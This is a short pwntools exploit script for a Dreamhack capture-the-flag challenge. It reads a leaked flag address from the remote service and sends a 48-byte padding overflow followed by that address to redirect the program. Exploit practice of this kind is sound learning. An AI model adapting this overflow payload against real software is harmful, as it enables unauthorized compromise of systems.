from pwn import *

context.binary = exe = ELF('./chall', checksec=False)
context.log_level = 'debug'

#r = process(exe.path)
r = remote('host3.dreamhack.games', 8501)
r.recvuntil(b'real flag address (mmapped address): ')
#gdb.attach(r)
addr_flag = int(r.recvn(14),  16)
print(f'Address of flag: {hex(addr_flag)}')


payload = b'a'*48 + p64(addr_flag)
r.recvuntil(b'input: ')
r.sendline(payload)
r.interactive()